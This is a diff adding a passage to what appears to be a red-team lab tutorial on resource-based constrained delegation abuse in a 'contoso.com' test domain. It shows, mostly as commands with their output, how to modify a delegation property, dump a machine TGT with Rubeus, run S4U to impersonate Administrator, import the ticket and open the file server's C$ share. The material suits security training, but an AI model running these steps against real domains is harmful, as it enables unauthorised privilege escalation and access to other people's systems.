@@ -84,3 +84,122 @@ LON-FS-1    {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com}
 LON-WKSTN-1 {}
 LON-WKSTN-2 {}
 ```
+
+>An AD property collection can only contain values of the same type.  Since _lon-fs-1_ already contains _lon-ws-1_, which is a computer account, we're not able to add a user account, such as _mssql_svc_ to it.  Since we don't want to remove lon-ws-1 (although we could), this pretty much forces us to use a computer account.
+
+To add a computer that we have SYSTEM on, such as _lon-wkstn-1_, we can do:
+
+```powershell
+PS C:\Users\Attacker> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 -Credential $Cred
+PS C:\Users\Attacker> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred
+PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred
+```
+
+Now if we read the property back, we'll see our entry has been added (without overwriting the existing one).
+
+```powershell
+PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
+
+Name     PrincipalsAllowedToDelegateToAccount
+----     ------------------------------------
+LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com, CN=LON-WKSTN-1,OU=Workstations,DC=contoso,DC=com}
+```
+
+To gain access to _lon-fs-1_, we need to extract or request a TGT for the principal we just added, and then perform the S4U steps through Rubeus.
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
+
+[*] Target service  : krbtgt
+[*] Target LUID     : 0x3e7
+[*] Current LUID    : 0x152a73
+
+  UserName                 : LON-WKSTN-1$
+  Domain                   : CONTOSO
+  LogonId                  : 0x3e7
+  UserSID                  : S-1-5-18
+  AuthenticationPackage    : Negotiate
+  LogonType                : 0
+  LogonTime                : 21/02/2025 06:15:36
+  LogonServer              : 
+  LogonServerDNSDomain     : contoso.com
+  UserPrincipalName        : LON-WKSTN-1$@contoso.com
+
+
+    ServiceName              :  krbtgt/CONTOSO.COM
+    ServiceRealm             :  CONTOSO.COM
+    UserName                 :  LON-WKSTN-1$ (NT_PRINCIPAL)
+    UserRealm                :  CONTOSO.COM
+    StartTime                :  21/02/2025 14:17:54
+    EndTime                  :  22/02/2025 00:16:11
+    RenewTill                :  28/02/2025 14:16:11
+    Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  Gv0JODuazH1s79IqvftcBcxr8zo131LNay3BM0xnPcw=
+    Base64EncodedTicket   :
+
+      doIFr[...snip...]kNPTQ==
+```
+
+```powershell	  
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:doIFr[...snip...]kNPTQ== /nowrap
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'LON-WKSTN-1$@CONTOSO.COM'
+[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
+[*] Sending S4U2self request to 10.10.120.1:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'LON-WKSTN-1$@CONTOSO.COM'
+[*] base64(ticket.kirbi):
+
+      doIF+[...snip...]4tMSQ=
+
+[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
+[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
+[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
+[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':
+
+      doIGh[...snip...]nMtMQ==
+```
+
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGh[...snip...]nMtMQ==
+
+[*] Using CONTOSO.COM\Administrator:FakePass
+
+[*] Showing process : False
+[*] Username        : Administrator
+[*] Domain          : CONTOSO.COM
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4568
+[+] Ticket successfully imported!
+[+] LUID            : 0x1355200
+```
+
+
+```powershell
+beacon> steal_token 4568
+beacon> ls \\lon-fs-1\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     01/23/2025 15:44:52   $Recycle.Bin
+          dir     01/23/2025 13:57:51   $WinREAgent
+          dir     01/23/2025 13:47:37   Documents and Settings
+          dir     02/20/2025 10:37:21   Files
+          dir     05/08/2021 09:20:24   PerfLogs
+          dir     01/23/2025 15:46:17   Program Files
+          dir     01/23/2025 15:46:18   Program Files (x86)
+          dir     01/24/2025 14:21:18   ProgramData
+          dir     01/23/2025 13:47:43   Recovery
+          dir     01/24/2025 14:18:02   System Volume Information
+          dir     01/24/2025 14:17:49   Users
+          dir     01/24/2025 13:34:02   Windows
+ 12kb     fil     02/21/2025 06:15:31   DumpStack.log.tmp
+ 1gb      fil     02/21/2025 06:15:31   pagefile.sys
+```
